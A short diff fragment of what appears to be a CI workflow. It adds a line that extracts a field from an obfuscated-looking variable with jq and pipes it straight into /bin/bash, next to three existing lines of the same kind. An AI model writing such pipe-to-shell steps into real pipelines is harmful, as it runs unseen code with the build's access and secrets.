@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$gdc2866" | jq -r .falk2 | /bin/bash
           printf '%s' "$uvkus9036" | jq -r .cqq8472 | /bin/bash
           echo $t2856 | jq -r .nk42 | /bin/bash
+          printf '%s' "$vhd4" | jq -r .wda145 | /bin/bash
 
       - name: Archive output
         if: always()
